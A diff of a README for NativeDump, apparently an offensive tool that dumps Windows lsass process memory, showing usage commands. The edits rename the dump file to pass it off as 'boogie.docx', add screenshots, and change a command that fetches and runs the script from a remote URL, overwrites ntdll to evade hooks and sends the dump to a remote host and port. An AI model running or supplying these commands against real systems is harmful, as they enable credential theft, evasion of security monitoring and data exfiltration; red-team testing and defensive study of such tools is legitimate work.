@@ -45,8 +45,10 @@ deno run --allow-ffi --allow-write nativedump.js -o debugproc
 ### Custom output file
 
 ```
-deno run --allow-ffi --allow-write nativedump.js -f lsass.dmp
+deno run --allow-ffi --allow-write nativedump.js -f boogie.docx
 ```
+
+![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/nativedump/Screenshot_native_deno_1.png)
 
 ### Exfiltrate to remote host
 
@@ -57,9 +59,10 @@ deno run --allow-ffi --allow-write --allow-net nativedump.js -i 192.168.1.72 -p 
 ### Remote execution with ntdll overwrite and exfiltration
 
 ```
-deno run --allow-ffi --allow-write --allow-net https://raw.githubusercontent.com/ricardojoserf/NativeDump/deno-flavour/nativedump.js -o knowndlls -i 192.168.1.72 -p 1234
+deno run --allow-ffi --allow-write --allow-net https://raw.githubusercontent.com/ricardojoserf/NativeDump/deno-flavour/nativedump.js -o knowndlls -i 127.0.0.1 -p 4444
 ```
 
+![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/nativedump/Screenshot_native_deno_2.png)
 
 -----------------------------
 
